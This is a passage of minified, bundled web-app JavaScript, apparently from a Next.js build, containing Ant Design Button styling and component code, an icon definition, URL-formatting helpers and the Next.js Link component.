y=e.i(15654),v=e.i(83293),S=e.i(28040),x=e.i(46422),C=e.i(38378),w=e.i(70977),k=e.i(71070),$=e.i(991),E=e.i(17933),P=e.i(88317),T=e.i(45978);let I=e=>{let{paddingInline:t,onlyIconSize:r,borderColorDisabled:n}=e;return(0,C.mergeToken)(e,{buttonPaddingHorizontal:t,buttonPaddingVertical:0,buttonIconOnlyFontSize:r,colorBorderDisabled:n})},M=e=>{let t=e.contentFontSize??e.fontSize,r=e.contentFontSizeSM??e.fontSize,n=e.contentFontSizeLG??e.fontSizeLG,o=e.contentLineHeight??(0,P.getLineHeight)(t),a=e.contentLineHeightSM??(0,P.getLineHeight)(r),i=e.contentLineHeightLG??(0,P.getLineHeight)(n),s=(0,$.isBright)(new k.AggregationColor(e.colorBgSolid),"#fff")?"#000":"#fff",l=E.PresetColors.reduce((t,r)=>({...t,[`${r}ShadowColor`]:`0 ${(0,y.unit)(e.controlOutlineWidth)} 0 ${(0,T.default)(e[`${r}1`],e.colorBgContainer)}`}),{}),c=e.colorBgContainerDisabled,u=e.colorBgContainerDisabled;return{...l,fontWeight:400,iconGap:e.marginXS,defaultShadow:`0 ${e.controlOutlineWidth}px 0 ${e.controlTmpOutline}`,primaryShadow:`0 ${e.controlOutlineWidth}px 0 ${e.controlOutline}`,dangerShadow:`0 ${e.controlOutlineWidth}px 0 ${e.colorErrorOutline}`,primaryColor:e.colorTextLightSolid,dangerColor:e.colorTextLightSolid,borderColorDisabled:e.colorBorderDisabled,defaultGhostColor:e.colorBgContainer,ghostBg:"transparent",defaultGhostBorderColor:e.colorBgContainer,paddingInline:e.paddingContentHorizontal-e.lineWidth,paddingInlineLG:e.paddingContentHorizontal-e.lineWidth,paddingInlineSM:8-e.lineWidth,onlyIconSize:"inherit",onlyIconSizeSM:"inherit",onlyIconSizeLG:"inherit",groupBorderColor:e.colorPrimaryHover,linkHoverBg:"transparent",textTextColor:e.colorText,textTextHoverColor:e.colorText,textTextActiveColor:e.colorText,textHoverBg:e.colorFillTertiary,defaultColor:e.colorText,defaultBg:e.colorBgContainer,defaultBorderColor:e.colorBorder,defaultBorderColorDisabled:e.colorBorder,defaultHoverBg:e.colorBgContainer,defaultHoverColor:e.colorPrimaryHover,defaultHoverBorderColor:e.colorPrimaryHover,defaultActiveBg:e.colorBgContainer,defaultActiveColor:e.colorPrimaryActive,defaultActiveBorderColor:e.colorPrimaryActive,solidTextColor:s,contentFontSize:t,contentFontSizeSM:r,contentFontSizeLG:n,contentLineHeight:o,contentLineHeightSM:a,contentLineHeightLG:i,paddingBlock:Math.max((e.controlHeight-t*o)/2-e.lineWidth,0),paddingBlockSM:Math.max((e.controlHeightSM-r*a)/2-e.lineWidth,0),paddingBlockLG:Math.max((e.controlHeightLG-n*i)/2-e.lineWidth,0),defaultBgDisabled:c,dashedBgDisabled:u}},R=(e,t="")=>{let{componentCls:r,controlHeight:n,fontSize:o,borderRadius:a,buttonPaddingHorizontal:i,iconCls:s,buttonPaddingVertical:l,buttonIconOnlyFontSize:c}=e;return[{[t]:{fontSize:o,height:n,padding:`${(0,y.unit)(l)} ${(0,y.unit)(i)}`,borderRadius:a,[`&${r}-icon-only`]:{width:n,[s]:{fontSize:c}}}},{[`${r}${r}-circle${t}`]:{minWidth:e.controlHeight,paddingInline:0,borderRadius:"50%"}},{[`${r}${r}-round${t}`]:{borderRadius:e.controlHeight,[`&:not(${r}-icon-only)`]:{paddingInline:e.buttonPaddingHorizontal}}}]},A=(0,x.genStyleHooks)("Button",e=>{let t=I(e);return[(e=>{let{componentCls:t,iconCls:r,fontWeight:n,opacityLoading:o,motionDurationSlow:a,motionEaseInOut:i,iconGap:s,calc:l}=e;return{[t]:{outline:"none",position:"relative",display:"inline-flex",gap:s,alignItems:"center",justifyContent:"center",fontWeight:n,whiteSpace:"nowrap",textAlign:"center",backgroundImage:"none",cursor:"pointer",transition:`all ${e.motionDurationMid} ${e.motionEaseInOut}`,userSelect:"none",touchAction:"manipulation",...(0,S.genNoMotionStyle)(),"&:disabled > *":{pointerEvents:"none"},[`${t}-icon > svg`]:(0,v.resetIcon)(),"> a":{color:"currentColor"},"&:not(:disabled)":(0,v.genFocusStyle)(e),[`&${t}-two-chinese-chars::first-letter`]:{letterSpacing:"0.34em"},[`&${t}-two-chinese-chars > *:not(${r})`]:{marginInlineEnd:"-0.34em",letterSpacing:"0.34em"},[`&${t}-icon-only`]:{paddingInline:0,[`&${t}-compact-item`]:{flex:"none"}},[`&${t}-loading`]:{opacity:o,cursor:"default"},[`${t}-loading-icon`]:{transition:["width","opacity","margin"].map(e=>`${e} ${a} ${i}`).join(",")},[`&:not(${t}-icon-end)`]:{[`${t}-loading-icon-motion`]:{"&-appear-start, &-enter-start":{marginInlineEnd:l(s).mul(-1).equal()},"&-appear-active, &-enter-active":{marginInlineEnd:0},"&-leave-start":{marginInlineEnd:0},"&-leave-active":{marginInlineEnd:l(s).mul(-1).equal()}}},"&-icon-end":{flexDirection:"row-reverse",[`${t}-loading-icon-motion`]:{"&-appear-start, &-enter-start":{marginInlineStart:l(s).mul(-1).equal()},"&-appear-active, &-enter-active":{marginInlineStart:0},"&-leave-start":{marginInlineStart:0},"&-leave-active":{marginInlineStart:l(s).mul(-1).equal()}}}}}})(t),R((0,C.mergeToken)(t,{fontSize:t.contentFontSize}),t.componentCls),R((0,C.mergeToken)(t,{controlHeight:t.controlHeightSM,fontSize:t.contentFontSizeSM,padding:t.paddingXS,buttonPaddingHorizontal:t.paddingInlineSM,buttonPaddingVertical:0,borderRadius:t.borderRadiusSM,buttonIconOnlyFontSize:t.onlyIconSizeSM}),`${t.componentCls}-sm`),R((0,C.mergeToken)(t,{controlHeight:t.controlHeightLG,fontSize:t.contentFontSizeLG,buttonPaddingHorizontal:t.paddingInlineLG,buttonPaddingVertical:0,borderRadius:t.borderRadiusLG,buttonIconOnlyFontSize:t.onlyIconSizeLG}),`${t.componentCls}-lg`),(e=>{let{componentCls:t}=e;return{[t]:{[`&${t}-block`]:{width:"100%"}}}})(t),(e=>{let{componentCls:t,antCls:r,lineWidth:n}=e,[o,a]=(0,x.genCssVar)(r,"btn");return{[t]:[{[o("border-width")]:n,[o("border-color")]:"#000",[o("border-color-hover")]:a("border-color"),[o("border-color-active")]:a("border-color"),[o("border-color-disabled")]:a("border-color"),[o("border-style")]:"solid",[o("text-color")]:"#000",[o("text-color-hover")]:a("text-color"),[o("text-color-active")]:a("text-color"),[o("text-color-disabled")]:a("text-color"),[o("bg-color")]:"#ddd",[o("bg-color-hover")]:a("bg-color"),[o("bg-color-active")]:a("bg-color"),[o("bg-color-disabled")]:e.colorBgContainerDisabled,[o("bg-color-container")]:e.colorBgContainer,[o("shadow")]:"none"},{border:[a("border-width"),a("border-style"),a("border-color")].join(" "),color:a("text-color"),backgroundColor:a("bg-color"),[`&:not(:disabled):not(${t}-disabled)`]:{"&:hover":{border:[a("border-width"),a("border-style"),a("border-color-hover")].join(" "),color:a("text-color-hover"),backgroundColor:a("bg-color-hover")},"&:active":{border:[a("border-width"),a("border-style"),a("border-color-active")].join(" "),color:a("text-color-active"),backgroundColor:a("bg-color-active")}}},{[`&${t}-variant-solid`]:{[o("solid-bg-color")]:a("color-base"),[o("solid-bg-color-hover")]:a("color-hover"),[o("solid-bg-color-active")]:a("color-active"),[o("border-color")]:"transparent",[o("text-color")]:e.colorTextLightSolid,[o("bg-color")]:a("solid-bg-color"),[o("bg-color-hover")]:a("solid-bg-color-hover"),[o("bg-color-active")]:a("solid-bg-color-active"),boxShadow:a("shadow")},[`&${t}-variant-outlined, &${t}-variant-dashed`]:{[o("border-color")]:a("color-base"),[o("border-color-hover")]:a("color-hover"),[o("border-color-active")]:a("color-active"),[o("bg-color")]:a("bg-color-container"),[o("text-color")]:a("color-base"),[o("text-color-hover")]:a("color-hover"),[o("text-color-active")]:a("color-active"),boxShadow:a("shadow")},[`&${t}-variant-dashed`]:{[o("border-style")]:"dashed",[o("bg-color-disabled")]:e.dashedBgDisabled},[`&${t}-variant-filled`]:{[o("border-color")]:"transparent",[o("text-color")]:a("color-base"),[o("bg-color")]:a("color-light"),[o("bg-color-hover")]:a("color-light-hover"),[o("bg-color-active")]:a("color-light-active")},[`&${t}-variant-text, &${t}-variant-link`]:{[o("border-color")]:"transparent",[o("text-color")]:a("color-base"),[o("text-color-hover")]:a("color-hover"),[o("text-color-active")]:a("color-active"),[o("bg-color")]:"transparent",[o("bg-color-hover")]:"transparent",[o("bg-color-active")]:"transparent",[`&:disabled, &${e.componentCls}-disabled`]:{background:"transparent",borderColor:"transparent"}},[`&${t}-variant-text`]:{[o("bg-color-hover")]:a("color-light"),[o("bg-color-active")]:a("color-light-active")}},{[`&${t}-variant-link`]:{[o("color-base")]:e.colorLink,[o("color-hover")]:e.colorLinkHover,[o("color-active")]:e.colorLinkActive,[o("bg-color-hover")]:e.linkHoverBg},[`&${t}-color-primary`]:{[o("color-base")]:e.colorPrimary,[o("color-hover")]:e.colorPrimaryHover,[o("color-active")]:e.colorPrimaryActive,[o("color-light")]:e.colorPrimaryBg,[o("color-light-hover")]:e.colorPrimaryBgHover,[o("color-light-active")]:e.colorPrimaryBorder,[o("shadow")]:e.primaryShadow,[`&${t}-variant-solid`]:{[o("text-color")]:e.primaryColor,[o("text-color-hover")]:a("text-color"),[o("text-color-active")]:a("text-color")}},[`&${t}-color-dangerous`]:{[o("color-base")]:e.colorError,[o("color-hover")]:e.colorErrorHover,[o("color-active")]:e.colorErrorActive,[o("color-light")]:e.colorErrorBg,[o("color-light-hover")]:e.colorErrorBgFilledHover,[o("color-light-active")]:e.colorErrorBgActive,[o("shadow")]:e.dangerShadow,[`&${t}-variant-solid`]:{[o("text-color")]:e.dangerColor,[o("text-color-hover")]:a("text-color"),[o("text-color-active")]:a("text-color")}},[`&${t}-color-default`]:{[o("solid-bg-color")]:e.colorBgSolid,[o("solid-bg-color-hover")]:e.colorBgSolidHover,[o("solid-bg-color-active")]:e.colorBgSolidActive,[o("color-base")]:e.defaultBorderColor,[o("color-hover")]:e.defaultHoverBorderColor,[o("color-active")]:e.defaultActiveBorderColor,[o("color-light")]:e.colorFillTertiary,[o("color-light-hover")]:e.colorFillSecondary,[o("color-light-active")]:e.colorFill,[o("text-color")]:e.defaultColor,[o("text-color-hover")]:e.defaultHoverColor,[o("text-color-active")]:e.defaultActiveColor,[o("shadow")]:e.defaultShadow,[`&${t}-variant-outlined`]:{[o("bg-color-disabled")]:e.defaultBgDisabled},[`&${t}-variant-solid`]:{[o("text-color")]:e.solidTextColor,[o("text-color-hover")]:a("text-color"),[o("text-color-active")]:a("text-color")},[`&${t}-variant-filled, &${t}-variant-text`]:{[o("text-color-hover")]:a("text-color"),[o("text-color-active")]:a("text-color")},[`&${t}-variant-outlined, &${t}-variant-dashed`]:{[o("text-color")]:e.defaultColor,[o("text-color-hover")]:e.defaultHoverColor,[o("text-color-active")]:e.defaultActiveColor,[o("bg-color-container")]:e.defaultBg,[o("bg-color-hover")]:e.defaultHoverBg,[o("bg-color-active")]:e.defaultActiveBg},[`&${t}-variant-text`]:{[o("text-color")]:e.textTextColor,[o("text-color-hover")]:e.textTextHoverColor,[o("text-color-active")]:e.textTextActiveColor,[o("bg-color-hover")]:e.textHoverBg},[`&${t}-background-ghost`]:{[`&${t}-variant-outlined, &${t}-variant-dashed`]:{[o("text-color")]:e.defaultGhostColor,[o("border-color")]:e.defaultGhostBorderColor}}}},E.PresetColors.map(r=>{let n=e[`${r}6`],a=e[`${r}1`],i=e[`${r}Hover`],s=e[`${r}2`],l=e[`${r}3`],c=e[`${r}Active`],u=e[`${r}ShadowColor`];return{[`&${t}-color-${r}`]:{[o("color-base")]:n,[o("color-hover")]:i,[o("color-active")]:c,[o("color-light")]:a,[o("color-light-hover")]:s,[o("color-light-active")]:l,[o("shadow")]:u}}}),{[`&:disabled, &${e.componentCls}-disabled`]:{cursor:"not-allowed",borderColor:e.colorBorderDisabled,background:a("bg-color-disabled"),color:e.colorTextDisabled,boxShadow:"none"}},{[`&${t}-background-ghost`]:{[o("bg-color")]:e.ghostBg,[o("bg-color-hover")]:e.ghostBg,[o("bg-color-active")]:e.ghostBg,[o("shadow")]:"none",[`&${t}-variant-outlined, &${t}-variant-dashed`]:{[o("bg-color-hover")]:e.ghostBg,[o("bg-color-active")]:e.ghostBg}}}]}})(t),(0,w.default)(t)]},M,{unitless:{fontWeight:!0,contentLineHeight:!0,contentLineHeightSM:!0,contentLineHeightLG:!0}});var D=e.i(72409);let L=(0,x.genSubStyleComponent)(["Button","compact"],e=>{var t,r;let n,o=I(e);return[(0,D.genCompactItemStyle)(o),{[n=`${o.componentCls}-compact-vertical`]:{...(t=o.componentCls,{[`&-item:not(${n}-last-item)`]:{marginBottom:o.calc(o.lineWidth).mul(-1).equal()},[`&-item:not(${t}-status-success)`]:{zIndex:2},"&-item":{"&:hover,&:focus,&:active":{zIndex:3},"&[disabled]":{zIndex:0}}}),...(r=o.componentCls,{[`&-item:not(${n}-first-item):not(${n}-last-item)`]:{borderRadius:0},[`&-item${n}-first-item:not(${n}-last-item)`]:{[`&, &${r}-sm, &${r}-lg`]:{borderEndEndRadius:0,borderEndStartRadius:0}},[`&-item${n}-last-item:not(${n}-first-item)`]:{[`&, &${r}-sm, &${r}-lg`]:{borderStartStartRadius:0,borderStartEndRadius:0}}})}},(e=>{let{antCls:t,componentCls:r,lineWidth:n,calc:o,colorBgContainer:a}=e,i=`${r}-variant-solid:not([disabled])`,s=o(n).mul(-1).equal(),[l,c]=(0,x.genCssVar)(t,"btn"),u=e=>({[`${r}-compact${e?"-vertical":""}-item`]:{[l("compact-connect-border-color")]:c("bg-color-hover"),[`&${i}`]:{transition:"none",[`& + ${i}:before`]:[{position:"absolute",backgroundColor:c("compact-connect-border-color"),content:'""'},e?{top:s,insetInline:s,height:n}:{insetBlock:s,insetInlineStart:s,width:n}],"&:hover:before":{display:"none"}}}});return[u(),u(!0),{[`${i}${r}-color-default`]:{[l("compact-connect-border-color")]:`color-mix(in srgb, ${c("bg-color-hover")} 75%, ${a})`}}]})(o)]},M),_={default:["default","outlined"],primary:["primary","solid"],dashed:["default","dashed"],link:["link","link"],text:["default","text"]},O=t.default.forwardRef((e,y)=>{let v,{_skipSemantic:S,loading:x=!1,prefixCls:C,color:w,variant:k,type:$,danger:E=!1,shape:P,size:T,disabled:I,className:M,rootClassName:R,children:D,icon:O,iconPosition:N,iconPlacement:F,ghost:j=!1,block:H=!1,htmlType:B="button",classNames:z,styles:V,style:W,autoInsertSpace:U,autoFocus:q,...G}=e,J=(0,n.toArray)(D),X=$||"default",{getPrefixCls:K,direction:Q,autoInsertSpace:Y,className:Z,style:ee,classNames:et,styles:er,loadingIcon:en,shape:eo,color:ea,variant:ei}=(0,u.useComponentConfig)("button"),es=P||eo||"default",[el,ec]=(0,t.useMemo)(()=>{if(w&&k)return[w,k];if($||E){let e=_[X]||[];return E?["danger",e[1]]:e}return ea&&ei?[ea,ei]:["default","outlined"]},[w,k,$,E,ea,ei,X]),[eu,ed]=(0,t.useMemo)(()=>j&&"solid"===ec?[el,"outlined"]:[el,ec],[el,ec,j]),ep="danger"===eu,em=ep?"dangerous":eu,ef=U??Y??!0,eg=K("btn",C),[eh,eb]=A(eg),ey=(0,t.useContext)(d.default),ev=I??ey,eS=(0,t.useContext)(f.GroupSizeContext),ex=(0,t.useMemo)(()=>(function(e){if("object"==typeof e&&e){let t=e?.delay;return{loading:(t=Number.isNaN(t)||"number"!=typeof t?0:t)<=0,delay:t}}return{loading:!!e,delay:0}})(x),[x]),[eC,ew]=(0,t.useState)(ex.loading),[ek,e$]=(0,t.useState)(!1),eE=(0,t.useRef)(null),eP=(0,o.useComposeRef)(y,eE),eT=1===J.length&&!O&&!(0,g.isUnBorderedButtonVariant)(ed),eI=(0,t.useRef)(!0);t.default.useEffect(()=>(eI.current=!1,()=>{eI.current=!0}),[]),(0,a.default)(()=>{let e=null;return ex.delay>0?e=setTimeout(()=>{e=null,ew(!0)},ex.delay):ew(ex.loading),function(){e&&(clearTimeout(e),e=null)}},[ex.delay,ex.loading]),(0,t.useEffect)(()=>{if(!eE.current||!ef)return;let e=eE.current.textContent||"";eT&&(0,g.isTwoCNChar)(e)?ek||e$(!0):ek&&e$(!1)}),(0,t.useEffect)(()=>{q&&eE.current&&eE.current.focus()},[]);let eM=t.default.useCallback(t=>{eC||ev?t.preventDefault():e.onClick?.(("href"in e,t))},[e.onClick,eC,ev]),{compactSize:eR,compactItemClassnames:eA}=(0,m.useCompactItemContext)(eg,Q),eD=(0,p.default)(e=>T??eR??eS??e),eL=eC?"loading":O,e_=F??N??"start",eO=(0,r.omit)(G,["navigate"]),eN={...e,type:X,color:eu,variant:ed,danger:ep,shape:es,size:eD,disabled:ev,loading:eC,iconPlacement:e_},[eF,ej]=(0,s.useMergeSemantic)([S?void 0:et,z],[S?void 0:er,V],{props:eN}),eH=(0,i.clsx)(eg,eh,eb,{[`${eg}-${es}`]:"default"!==es&&"square"!==es&&es,[`${eg}-${X}`]:X,[`${eg}-dangerous`]:E,[`${eg}-color-${em}`]:em,[`${eg}-variant-${ed}`]:ed,[`${eg}-lg`]:"large"===eD,[`${eg}-sm`]:"small"===eD,[`${eg}-icon-only`]:!D&&0!==D&&!!eL,[`${eg}-background-ghost`]:j&&!(0,g.isUnBorderedButtonVariant)(ed),[`${eg}-loading`]:eC,[`${eg}-two-chinese-chars`]:ek&&ef&&!eC,[`${eg}-block`]:H,[`${eg}-rtl`]:"rtl"===Q,[`${eg}-icon-end`]:"end"===e_},eA,M,R,Z,eF.root),eB={...ej.root,...ee,...W},ez={className:eF.icon,style:ej.icon},eV=e=>t.default.createElement(b.default,{prefixCls:eg,...ez},e),eW=t.default.createElement(h.default,{existIcon:!!O,prefixCls:eg,loading:eC,mount:eI.current,...ez}),eU=x&&"object"==typeof x&&x.icon||en;v=O&&!eC?eV(O):x&&eU?eV(eU):eW;let eq=(0,l.default)(D)?(0,g.spaceChildren)(D,eT&&ef,ej.content,eF.content):null;if(void 0!==eO.href)return t.default.createElement("a",{...eO,className:(0,i.clsx)(eH,{[`${eg}-disabled`]:ev}),href:ev?void 0:eO.href,style:eB,onClick:eM,ref:eP,tabIndex:ev?-1:0,"aria-disabled":ev},v,eq);let eG=t.default.createElement("button",{...G,type:B,className:eH,style:eB,onClick:eM,disabled:ev,ref:eP},v,eq,eA&&t.default.createElement(L,{prefixCls:eg}));return(0,g.isUnBorderedButtonVariant)(ed)||(eG=t.default.createElement(c.default,{component:"Button",disabled:eC},eG)),eG});O.Group=f.default,O.__ANT_BUTTON=!0,e.s(["default",0,O],34596)},64571,e=>{"use strict";let t=e.i(34596).default;e.s(["Button",0,t],64571)},34779,e=>{"use strict";e.i(47167);var t=e.i(71645);let r={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M832 64H192c-17.7 0-32 14.3-32 32v832c0 17.7 14.3 32 32 32h640c17.7 0 32-14.3 32-32V96c0-17.7-14.3-32-32-32zm-260 72h96v209.9L621.5 312 572 347.4V136zm220 752H232V136h280v296.9c0 3.3 1 6.6 3 9.3a15.9 15.9 0 0022.3 3.7l83.8-59.9 81.4 59.4c2.7 2 6 3.1 9.4 3.1 8.8 0 16-7.2 16-16V136h64v752z"}}]},name:"book",theme:"outlined"};var n=e.i(9583);function o(){return(o=Object.assign.bind()).apply(this,arguments)}let a=t.forwardRef((e,a)=>t.createElement(n.default,o({},e,{ref:a,icon:r})));e.s(["BookOutlined",0,a],34779)},98183,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0});var n={assign:function(){return l},searchParamsToUrlQuery:function(){return a},urlQueryToSearchParams:function(){return s}};for(var o in n)Object.defineProperty(r,o,{enumerable:!0,get:n[o]});function a(e){let t={};for(let[r,n]of e.entries()){let e=t[r];void 0===e?t[r]=n:Array.isArray(e)?e.push(n):t[r]=[e,n]}return t}function i(e){return"string"==typeof e?e:("number"!=typeof e||isNaN(e))&&"boolean"!=typeof e?"":String(e)}function s(e){let t=new URLSearchParams;for(let[r,n]of Object.entries(e))if(Array.isArray(n))for(let e of n)t.append(r,i(e));else t.set(r,i(n));return t}function l(e,...t){for(let r of t){for(let t of r.keys())e.delete(t);for(let[t,n]of r.entries())e.append(t,n)}return e}},95057,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0});var n={formatUrl:function(){return s},formatWithValidation:function(){return c},urlObjectKeys:function(){return l}};for(var o in n)Object.defineProperty(r,o,{enumerable:!0,get:n[o]});let a=e.r(90809)._(e.r(98183)),i=/https?|ftp|gopher|file/;function s(e){let{auth:t,hostname:r}=e,n=e.protocol||"",o=e.pathname||"",s=e.hash||"",l=e.query||"",c=!1;t=t?encodeURIComponent(t).replace(/%3A/i,":")+"@":"",e.host?c=t+e.host:r&&(c=t+(~r.indexOf(":")?`[${r}]`:r),e.port&&(c+=":"+e.port)),l&&"object"==typeof l&&(l=String(a.urlQueryToSearchParams(l)));let u=e.search||l&&`?${l}`||"";return n&&!n.endsWith(":")&&(n+=":"),e.slashes||(!n||i.test(n))&&!1!==c?(c="//"+(c||""),o&&"/"!==o[0]&&(o="/"+o)):c||(c=""),s&&"#"!==s[0]&&(s="#"+s),u&&"?"!==u[0]&&(u="?"+u),o=o.replace(/[?#]/g,encodeURIComponent),u=u.replace("#","%23"),`${n}${c}${o}${u}${s}`}let l=["auth","hash","host","hostname","href","path","pathname","port","protocol","query","search","slashes"];function c(e){return s(e)}},18581,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0}),Object.defineProperty(r,"useMergedRef",{enumerable:!0,get:function(){return o}});let n=e.r(71645);function o(e,t){let r=(0,n.useRef)(null),o=(0,n.useRef)(null);return(0,n.useCallback)(n=>{if(null===n){let e=r.current;e&&(r.current=null,e());let t=o.current;t&&(o.current=null,t())}else e&&(r.current=a(e,n)),t&&(o.current=a(t,n))},[e,t])}function a(e,t){if("function"!=typeof e)return e.current=t,()=>{e.current=null};{let r=e(t);return"function"==typeof r?r:()=>e(null)}}("function"==typeof r.default||"object"==typeof r.default&&null!==r.default)&&void 0===r.default.__esModule&&(Object.defineProperty(r.default,"__esModule",{value:!0}),Object.assign(r.default,r),t.exports=r.default)},18967,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0});var n={DecodeError:function(){return b},MiddlewareNotFoundError:function(){return x},MissingStaticPage:function(){return S},NormalizeError:function(){return y},PageNotFoundError:function(){return v},SP:function(){return g},ST:function(){return h},WEB_VITALS:function(){return a},execOnce:function(){return i},getDisplayName:function(){return d},getLocationOrigin:function(){return c},getURL:function(){return u},isAbsoluteUrl:function(){return l},isResSent:function(){return p},loadGetInitialProps:function(){return f},normalizeRepeatedSlashes:function(){return m},stringifyError:function(){return C}};for(var o in n)Object.defineProperty(r,o,{enumerable:!0,get:n[o]});let a=["CLS","FCP","FID","INP","LCP","TTFB"];function i(e){let t,r=!1;return(...n)=>(r||(r=!0,t=e(...n)),t)}let s=/^[a-zA-Z][a-zA-Z\d+\-.]*?:/,l=e=>s.test(e);function c(){let{protocol:e,hostname:t,port:r}=window.location;return`${e}//${t}${r?":"+r:""}`}function u(){let{href:e}=window.location,t=c();return e.substring(t.length)}function d(e){return"string"==typeof e?e:e.displayName||e.name||"Unknown"}function p(e){return e.finished||e.headersSent}function m(e){let t=e.split("?");return t[0].replace(/\\/g,"/").replace(/\/\/+/g,"/")+(t[1]?`?${t.slice(1).join("?")}`:"")}async function f(e,t){let r=t.res||t.ctx&&t.ctx.res;if(!e.getInitialProps)return t.ctx&&t.Component?{pageProps:await f(t.Component,t.ctx)}:{};let n=await e.getInitialProps(t);if(r&&p(r))return n;if(!n)throw Object.defineProperty(Error(`"${d(e)}.getInitialProps()" should resolve to an object. But found "${n}" instead.`),"__NEXT_ERROR_CODE",{value:"E394",enumerable:!1,configurable:!0});return n}let g="u">typeof performance,h=g&&["mark","measure","getEntriesByName"].every(e=>"function"==typeof performance[e]);class b extends Error{}class y extends Error{}class v extends Error{constructor(e){super(),this.code="ENOENT",this.name="PageNotFoundError",this.message=`Cannot find module for page: ${e}`}}class S extends Error{constructor(e,t){super(),this.message=`Failed to load static file for page: ${e} ${t}`}}class x extends Error{constructor(){super(),this.code="ENOENT",this.message="Cannot find the middleware module"}}function C(e){return JSON.stringify({message:e.message,stack:e.stack})}},73668,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0}),Object.defineProperty(r,"isLocalURL",{enumerable:!0,get:function(){return a}});let n=e.r(18967),o=e.r(52817);function a(e){if(!(0,n.isAbsoluteUrl)(e))return!0;try{let t=(0,n.getLocationOrigin)(),r=new URL(e,t);return r.origin===t&&(0,o.hasBasePath)(r.pathname)}catch(e){return!1}}},84508,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0}),Object.defineProperty(r,"errorOnce",{enumerable:!0,get:function(){return n}});let n=e=>{}},22016,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0});var n={default:function(){return b},useLinkStatus:function(){return v}};for(var o in n)Object.defineProperty(r,o,{enumerable:!0,get:n[o]});let a=e.r(90809),i=e.r(43476),s=a._(e.r(71645)),l=e.r(95057),c=e.r(8372),u=e.r(18581),d=e.r(18967),p=e.r(5550);e.r(33525);let m=e.r(91949),f=e.r(73668),g=e.r(9396);function h(e){return"string"==typeof e?e:(0,l.formatUrl)(e)}function b(t){var r;let n,o,a,[l,b]=(0,s.useOptimistic)(m.IDLE_LINK_STATUS),v=(0,s.useRef)(null),{href:S,as:x,children:C,prefetch:w=null,passHref:k,replace:$,shallow:E,scroll:P,onClick:T,onMouseEnter:I,onTouchStart:M,legacyBehavior:R=!1,onNavigate:A,ref:D,unstable_dynamicOnHover:L,..._}=t;n=C,R&&("string"==typeof n||"number"==typeof n)&&(n=(0,i.jsx)("a",{children:n}));let O=s.default.useContext(c.AppRouterContext),N=!1!==w,F=!1!==w?null===(r=w)||"auto"===r?g.FetchStrategy.PPR:g.FetchStrategy.Full:g.FetchStrategy.PPR,{href:j,as:H}=s.default.useMemo(()=>{let e=h(S);return{href:e,as:x?h(x):e}},[S,x]);if(R){if(n?.$$typeof===Symbol.for("react.lazy"))throw Object.defineProperty(Error("`<Link legacyBehavior>` received a direct child that is either a Server Component, or JSX that was loaded with React.lazy(). This is not supported. Either remove legacyBehavior, or make the direct child a Client Component that renders the Link's `<a>` tag."),"__NEXT_ERROR_CODE",{value:"E863",enumerable:!1,configurable:!0});o=s.default.Children.only(n)}let B=R?o&&"object"==typeof o&&o.ref:D,z=s.default.useCallback(e=>(null!==O&&(v.current=(0,m.mountLinkInstance)(e,j,O,F,N,b)),()=>{v.current&&((0,m.unmountLinkForCurrentNavigation)(v.current),v.current=null),(0,m.unmountPrefetchableInstance)(e)}),[N,j,O,F,b]),V={ref:(0,u.useMergedRef)(z,B),onClick(t){R||"function"!=typeof T||T(t),R&&o.props&&"function"==typeof o.props.onClick&&o.props.onClick(t),!O||t.defaultPrevented||function(t,r,n,o,a,i,l){if("u">typeof window){let c,{nodeName:u}=t.currentTarget;if("A"===u.toUpperCase()&&((c=t.currentTarget.getAttribute("target"))&&"_self"!==c||t.metaKey||t.ctrlKey||t.shiftKey||t.altKey||t.nativeEvent&&2===t.nativeEvent.which)||t.currentTarget.hasAttribute("download"))return;if(!(0,f.isLocalURL)(r)){a&&(t.preventDefault(),location.replace(r));return}if(t.preventDefault(),l){let e=!1;if(l({preventDefault:()=>{e=!0}}),e)return}let{dispatchNavigateAction:d}=e.r(99781);s.default.startTransition(()=>{d(n||r,a?"replace":"push",i??!0,o.current)})}}(t,j,H,v,$,P,A)},onMouseEnter(e){R||"function"!=typeof I||I(e),R&&o.props&&"function"==typeof o.props.onMouseEnter&&o.props.onMouseEnter(e),O&&N&&(0,m.onNavigationIntent)(e.currentTarget,!0===L)},onTouchStart:function(e){R||"function"!=typeof M||M(e),R&&o.props&&"function"==typeof o.props.onTouchStart&&o.props.onTouchStart(e),O&&N&&(0,m.onNavigationIntent)(e.currentTarget,!0===L)}};return(0,d.isAbsoluteUrl)(H)?V.href=H:R&&!k&&("a"!==o.type||"href"in o.props)||(V.href=(0,p.addBasePath)(H)),a=R?s.default.cloneElement(o,V):(0,i.jsx)("a",{..._,...V,children:n}),(0,i.jsx)(y.Provider,{value:l,children:a})}e.r(84508);let y=(0,s.createContext)(m.IDLE_LINK_STATUS),v=()=>(0,s.useContext)(y);("function"==typeof r.default||"object"==typeof r.default&&null!==r.default)&&void 0===r.default.__esModule&&(Object.defineProperty(r.default,"__esModule",{value:!0}),Object.assign(r.default,r),t.exports=r.default)},92989,(e,t,r)=>{t.exports=e.r(76562)},60699,52199,e=>{"use strict";e.i(47167);var t=e.i(71645),r=e.i(13381),n=e.i(33578),n=n,o=e.i(90224),a=e.i(67384);e.i(63335);var i=e.i(51095),s=e.i(80251),l=e.i(7670),c=e.i(11517),u=e.i(13541),d=e.i(63731),p=e.i(42064),m=e.i(21883);let f=(0,t.createContext)({prefixCls:"",firstLevel:!0,inlineCollapsed:!1,styles:null,classNames:null});var g=e.i(50211),g=g;let h=e=>{let{prefixCls:r,className:n,dashed:o,...a}=e,{getPrefixCls:i}=t.useContext(p.ConfigContext),s=i("menu",r),c=(0,l.clsx)({[`${s}-item-divider-dashed`]:!!o},n);return t.createElement(g.default,{className:c,...a})};var b=e.i(65044),b=b,y=e.i(43081),v=e.i(91816);let S=e=>{let 